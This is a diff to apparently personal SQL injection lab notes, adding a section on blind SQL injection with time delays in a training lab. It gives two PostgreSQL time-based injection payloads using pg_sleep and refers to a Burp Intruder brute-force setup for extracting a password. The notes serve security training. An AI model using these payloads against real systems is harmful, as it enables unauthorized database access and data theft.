@@ -101,7 +101,7 @@ Returns error (TRUE that password length is greater than 8):
 
 **With Burpsuite Intruder:**
 
-P1 = Index = 1-21
+P1 = Index = 1-21  
 P2 = Chars = 0-9+a-z+A-Z
 
 Create wordlist using python
@@ -125,3 +125,28 @@ Paste wordlist to Burpsuite intruder, use P1 in payload 1, P2 in payload 2.
 **Using my multithread script (took less than 5 minutes):**
 
  https://gist.github.com/fahmifj/13d055117f729a233a8f4ccbefdb1680
+
+## Lab: Blind SQL injection with time delays
+
+Assume the query is:
+
+```
+SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
+```
+
+Since it's a blind sql, using Payload list is my first option
+
+```
+' AND 5=(SELECT 5 FROM PG_SLEEP(10))
+``` 
+
+And here is the lab solution using string concatenation.
+
+```
+'||pg_sleep(10) --
+```
+
+Interesting..
+
+Reference
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-time-based
